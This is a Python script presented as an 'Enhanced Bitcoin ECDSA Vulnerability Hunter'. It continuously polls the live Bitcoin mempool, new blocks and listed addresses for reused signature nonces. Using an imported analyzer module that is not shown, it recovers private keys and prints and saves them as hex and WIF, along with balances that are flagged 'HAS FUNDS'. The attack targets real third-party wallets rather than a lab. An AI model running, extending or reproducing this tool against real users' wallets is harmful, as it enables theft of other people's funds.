
#!/usr/bin/env python3
import asyncio
import aiohttp
import time
import logging
from typing import Dict, List, Optional
import json
from btc_analyzer import BTCAnalyzer
import concurrent.futures
from address_list import ADDRESSES_TO_CHECK

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class EnhancedVulnerabilityHunter:
    def __init__(self):
        self.analyzer = BTCAnalyzer()
        self.session = None
        self.found_vulnerabilities = []
        self.scan_stats = {
            'total_scanned': 0,
            'mempool_scanned': 0,
            'blocks_scanned': 0,
            'addresses_scanned': 0,
            'vulnerabilities_found': 0
        }
    
    async def init_session(self):
        """Initialize aiohttp session"""
        self.session = aiohttp.ClientSession()
    
    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
    
    async def fetch_json(self, url: str) -> Optional[Dict]:
        """Fetch JSON data from URL"""
        try:
            async with self.session.get(url, timeout=15) as response:
                if response.status == 200:
                    return await response.json()
        except Exception as e:
            logger.debug(f"Fetch error for {url}: {e}")
        return None
    
    async def hunt_mempool_vulnerabilities(self):
        """Hunt for vulnerabilities in mempool"""
        logger.info("🔥 Starting aggressive mempool hunting...")
        
        while True:
            try:
                # Get mempool transactions
                mempool_data = await self.fetch_json(
                    'https://blockchain.info/unconfirmed-transactions?format=json'
                )
                
                if mempool_data:
                    transactions = mempool_data.get('txs', [])
                    logger.info(f"🎯 Hunting through {len(transactions)} mempool transactions...")
                    
                    # Process transactions in batches
                    for i in range(0, len(transactions), 10):
                        batch = transactions[i:i+10]
                        await self.process_transaction_batch(batch, "mempool")
                
                # Continuous scanning
                await asyncio.sleep(3)
                
            except Exception as e:
                logger.error(f"❌ Mempool hunting error: {e}")
                await asyncio.sleep(5)
    
    async def hunt_recent_blocks(self):
        """Hunt for vulnerabilities in recent blocks"""
        logger.info("⛏️  Starting block hunting...")
        
        while True:
            try:
                # Get latest block
                latest_block = await self.fetch_json('https://blockchain.info/latestblock')
                
                if latest_block:
                    block_hash = latest_block.get('hash')
                    block_data = await self.fetch_json(
                        f'https://blockchain.info/rawblock/{block_hash}'
                    )
                    
                    if block_data:
                        transactions = block_data.get('tx', [])
                        logger.info(f"⛏️  Mining block {block_hash[:16]}... ({len(transactions)} txs)")
                        
                        # Process all transactions in block
                        await self.process_transaction_batch(transactions, "block")
                
                await asyncio.sleep(60)  # Wait for next block
                
            except Exception as e:
                logger.error(f"❌ Block hunting error: {e}")
                await asyncio.sleep(10)
    
    async def hunt_address_vulnerabilities(self):
        """Hunt for vulnerabilities in known addresses"""
        logger.info("🏠 Starting address vulnerability hunting...")
        
        while True:
            for address in ADDRESSES_TO_CHECK:
                try:
                    logger.info(f"🎯 Hunting address: {address}")
                    
                    # Get address transactions
                    addr_data = await self.fetch_json(
                        f'https://blockchain.info/rawaddr/{address}'
                    )
                    
                    if addr_data:
                        transactions = addr_data.get('txs', [])
                        logger.info(f"📊 Address {address} has {len(transactions)} transactions")
                        
                        # Analyze for nonce reuse across all transactions
                        vulnerability = await self.deep_analyze_address(address, transactions)
                        
                        if vulnerability:
                            await self.report_vulnerability(vulnerability)
                    
                    await asyncio.sleep(2)
                    
                except Exception as e:
                    logger.error(f"❌ Address hunting error for {address}: {e}")
                    continue
            
            logger.info("🔄 Completed address hunting cycle, restarting...")
            await asyncio.sleep(10)
    
    async def process_transaction_batch(self, transactions: List[Dict], source: str):
        """Process a batch of transactions for vulnerabilities"""
        tasks = []
        
        for tx in transactions:
            tx_id = tx.get('hash')
            if tx_id:
                task = self.analyze_transaction_async(tx_id, source)
                tasks.append(task)
        
        # Process batch concurrently
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict) and result.get('vulnerable'):
                    await self.report_vulnerability(result)
    
    async def analyze_transaction_async(self, tx_id: str, source: str) -> Dict:
        """Analyze transaction asynchronously"""
        try:
            # Run blocking analyzer in thread pool
            loop = asyncio.get_event_loop()
            
            with concurrent.futures.ThreadPoolExecutor() as executor:
                result = await loop.run_in_executor(
                    executor, 
                    self.analyzer.analyze_transaction, 
                    tx_id
                )
            
            self.scan_stats['total_scanned'] += 1
            if source == "mempool":
                self.scan_stats['mempool_scanned'] += 1
            elif source == "block":
                self.scan_stats['blocks_scanned'] += 1
            
            # Check for vulnerabilities
            if self.is_vulnerable(result):
                return {
                    'vulnerable': True,
                    'tx_id': tx_id,
                    'source': source,
                    'analysis': result,
                    'timestamp': time.time()
                }
            
            return {'vulnerable': False}
            
        except Exception as e:
            logger.debug(f"Analysis error for {tx_id}: {e}")
            return {'vulnerable': False}
    
    async def deep_analyze_address(self, address: str, transactions: List[Dict]) -> Optional[Dict]:
        """Deep analysis of address for nonce reuse patterns"""
        try:
            # Extract all signatures from address transactions
            signatures_by_r = {}
            
            for tx in transactions:
                tx_id = tx.get('hash')
                if tx_id:
                    # Get transaction signatures
                    loop = asyncio.get_event_loop()
                    with concurrent.futures.ThreadPoolExecutor() as executor:
                        result = await loop.run_in_executor(
                            executor,
                            self.analyzer.analyze_transaction,
                            tx_id
                        )
                    
                    if result.get('signatures'):
                        for sig in result['signatures']:
                            r_value = sig.get('r')
                            if r_value:
                                if r_value not in signatures_by_r:
                                    signatures_by_r[r_value] = []
                                signatures_by_r[r_value].append({
                                    'tx_id': tx_id,
                                    'signature': sig
                                })
            
            # Look for nonce reuse (same r value)
            for r_value, sig_list in signatures_by_r.items():
                if len(sig_list) > 1:
                    logger.critical(f"🚨 NONCE REUSE DETECTED! Address: {address}, R: {r_value[:16]}...")
                    
                    return {
                        'vulnerable': True,
                        'type': 'nonce_reuse',
                        'address': address,
                        'r_value': r_value,
                        'affected_transactions': [s['tx_id'] for s in sig_list],
                        'signature_count': len(sig_list),
                        'timestamp': time.time()
                    }
            
            return None
            
        except Exception as e:
            logger.error(f"Deep analysis error for {address}: {e}")
            return None
    
    def is_vulnerable(self, analysis_result: Dict) -> bool:
        """Check if analysis result indicates vulnerability"""
        if not analysis_result or 'error' in analysis_result:
            return False
        
        # Check for private keys found
        if analysis_result.get('private_keys_found', 0) > 0:
            return True
        
        # Check for weak signatures
        weak_sigs = analysis_result.get('weak_signatures', [])
        for weak_sig in weak_sigs:
            if weak_sig.get('type') in ['reused_r', 'recovered_key']:
                return True
        
        return False
    
    async def report_vulnerability(self, vulnerability: Dict):
        """Report found vulnerability"""
        self.found_vulnerabilities.append(vulnerability)
        self.scan_stats['vulnerabilities_found'] += 1
        
        logger.critical("="*80)
        logger.critical("🚨🚨🚨 CRITICAL VULNERABILITY FOUND! 🚨🚨🚨")
        logger.critical("="*80)
        
        if 'tx_id' in vulnerability:
            logger.critical(f"🔍 Transaction: {vulnerability['tx_id']}")
        
        if 'address' in vulnerability:
            logger.critical(f"🏠 Address: {vulnerability['address']}")
        
        if 'type' in vulnerability:
            logger.critical(f"⚠️  Type: {vulnerability['type']}")
        
        # Extract private keys if available
        analysis = vulnerability.get('analysis', {})
        if analysis.get('weak_signatures'):
            for weak_sig in analysis['weak_signatures']:
                if weak_sig.get('type') == 'recovered_private_key':
                    logger.critical("🔓 ENHANCED HUNTER - PRIVATE KEY RECOVERY:")
                    logger.critical(f"🔑 Private Key (Hex): {weak_sig.get('private_key_hex', 'N/A')}")
                    logger.critical(f"🔢 Private Key (Decimal): {weak_sig.get('private_key_decimal', 'N/A')}")
                    logger.critical(f"📝 WIF (Compressed): {weak_sig.get('wif_compressed', 'N/A')}")
                    logger.critical(f"📝 WIF (Uncompressed): {weak_sig.get('wif_uncompressed', 'N/A')}")
                    logger.critical(f"🎯 Primary Address: {weak_sig.get('primary_address', 'N/A')} ({weak_sig.get('primary_address_type', 'N/A')})")
                    logger.critical(f"💰 Primary Balance: {weak_sig.get('primary_balance', 'N/A')} BTC")
                    logger.critical(f"💎 Total Balance: {weak_sig.get('total_balance', 'N/A')} BTC")
                    logger.critical(f"🏷️  Recovery Method: {weak_sig.get('recovery_method', 'N/A')}")
                    
                    # Log calculation details if available
                    if 'calculation_details' in weak_sig:
                        logger.critical("🧮 CALCULATION DETAILS:")
                        for key, value in weak_sig['calculation_details'].items():
                            logger.critical(f"   {key}: {value}")
                    
                    # Log all addresses
                    logger.critical("🏠 ALL ADDRESS FORMATS:")
                    if 'all_balances' in weak_sig:
                        for addr_type, addr_info in weak_sig['all_balances'].items():
                            status = "💰 HAS FUNDS" if addr_info['balance'] > 0 else "💸 EMPTY"
                            logger.critical(f"   {addr_type}: {addr_info['address']} - {addr_info['balance']:.8f} BTC {status}")
                    
                    # Save to enhanced hunter specific log
                    self._save_enhanced_recovery(weak_sig, vulnerability)
        
        logger.critical("="*80)
        
        # Save to file
        with open('vulnerabilities_found.json', 'a') as f:
            json.dump(vulnerability, f, indent=2)
            f.write('\n')
    
    async def _save_enhanced_recovery(self, weak_sig: Dict, vulnerability: Dict):
        """Save enhanced hunter recovery details"""
        try:
            import datetime
            
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            
            recovery_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'hunter_type': 'enhanced_async',
                'source': vulnerability.get('tx_id', vulnerability.get('address', 'unknown')),
                'vulnerability_type': vulnerability.get('type', 'unknown'),
                'private_key_hex': weak_sig.get('private_key_hex'),
                'private_key_decimal': weak_sig.get('private_key_decimal'),
                'wif_compressed': weak_sig.get('wif_compressed'),
                'wif_uncompressed': weak_sig.get('wif_uncompressed'),
                'primary_address': weak_sig.get('primary_address'),
                'primary_address_type': weak_sig.get('primary_address_type'),
                'primary_balance': weak_sig.get('primary_balance'),
                'total_balance': weak_sig.get('total_balance'),
                'recovery_method': weak_sig.get('recovery_method'),
                'all_addresses': weak_sig.get('all_addresses', {}),
                'all_balances': weak_sig.get('all_balances', {}),
                'calculation_details': weak_sig.get('calculation_details', {}),
                'scan_statistics': self.scan_stats,
                'full_vulnerability': vulnerability
            }
            
            # Save to enhanced hunter log
            with open('enhanced_hunter_recoveries.json', 'a') as f:
                json.dump(recovery_data, f, indent=2)
                f.write('\n')
            
            # Save summary format
            with open('enhanced_hunter_summary.txt', 'a') as f:
                f.write(f"\n{'='*120}\n")
                f.write(f"ENHANCED HUNTER RECOVERY #{timestamp}\n")
                f.write(f"{'='*120}\n")
                f.write(f"Source: {vulnerability.get('tx_id', vulnerability.get('address', 'unknown'))}\n")
                f.write(f"Vulnerability Type: {vulnerability.get('type', 'unknown')}\n")
                f.write(f"Recovery Method: {weak_sig.get('recovery_method', 'unknown')}\n")
                f.write(f"Private Key: {weak_sig.get('private_key_hex', 'N/A')}\n")
                f.write(f"WIF (Compressed): {weak_sig.get('wif_compressed', 'N/A')}\n")
                f.write(f"WIF (Uncompressed): {weak_sig.get('wif_uncompressed', 'N/A')}\n")
                f.write(f"Primary Address: {weak_sig.get('primary_address', 'N/A')} ({weak_sig.get('primary_address_type', 'N/A')})\n")
                f.write(f"Primary Balance: {weak_sig.get('primary_balance', 0):.8f} BTC\n")
                f.write(f"Total Balance: {weak_sig.get('total_balance', 0):.8f} BTC\n")
                
                f.write(f"\nScan Statistics at Discovery:\n")
                f.write(f"  Total Scanned: {self.scan_stats['total_scanned']}\n")
                f.write(f"  Mempool Scanned: {self.scan_stats['mempool_scanned']}\n")
                f.write(f"  Blocks Scanned: {self.scan_stats['blocks_scanned']}\n")
                f.write(f"  Vulnerabilities Found: {self.scan_stats['vulnerabilities_found']}\n")
                
                f.write(f"\nAll Address Formats and Balances:\n")
                for addr_type, addr_info in weak_sig.get('all_balances', {}).items():
                    f.write(f"  {addr_type}: {addr_info['address']} - {addr_info['balance']:.8f} BTC\n")
                
                if 'calculation_details' in weak_sig:
                    f.write(f"\nMathematical Calculation Details:\n")
                    for key, value in weak_sig['calculation_details'].items():
                        f.write(f"  {key}: {value}\n")
                
                f.write(f"{'='*120}\n")
                
        except Exception as e:
            logger.error(f"Error saving enhanced recovery details: {e}")
    
    async def print_stats(self):
        """Print scanning statistics"""
        while True:
            await asyncio.sleep(30)
            
            logger.info("="*50)
            logger.info("📊 HUNTING STATISTICS")
            logger.info("="*50)
            logger.info(f"Total Scanned: {self.scan_stats['total_scanned']}")
            logger.info(f"Mempool Scanned: {self.scan_stats['mempool_scanned']}")
            logger.info(f"Blocks Scanned: {self.scan_stats['blocks_scanned']}")
            logger.info(f"Vulnerabilities Found: {self.scan_stats['vulnerabilities_found']}")
            logger.info("="*50)
    
    async def hunt_continuously(self):
        """Start continuous vulnerability hunting"""
        await self.init_session()
        
        logger.info("🚀 Starting Enhanced Vulnerability Hunter!")
        logger.info("🎯 Will hunt continuously until vulnerabilities are found!")
        
        # Start all hunting tasks
        tasks = [
            self.hunt_mempool_vulnerabilities(),
            self.hunt_recent_blocks(),
            self.hunt_address_vulnerabilities(),
            self.print_stats()
        ]
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            logger.info("🛑 Stopping vulnerability hunter...")
        finally:
            await self.close_session()

async def main():
    hunter = EnhancedVulnerabilityHunter()
    
    print("""
🔥 Enhanced Bitcoin ECDSA Vulnerability Hunter
============================================
This hunter will aggressively search for:
- ECDSA nonce reuse vulnerabilities
- Weak signature patterns
- Private key recovery opportunities
- Real-time mempool monitoring
- Historical transaction analysis

Press Ctrl+C to stop.
""")
    
    await hunter.hunt_continuously()

if __name__ == "__main__":
    asyncio.run(main())
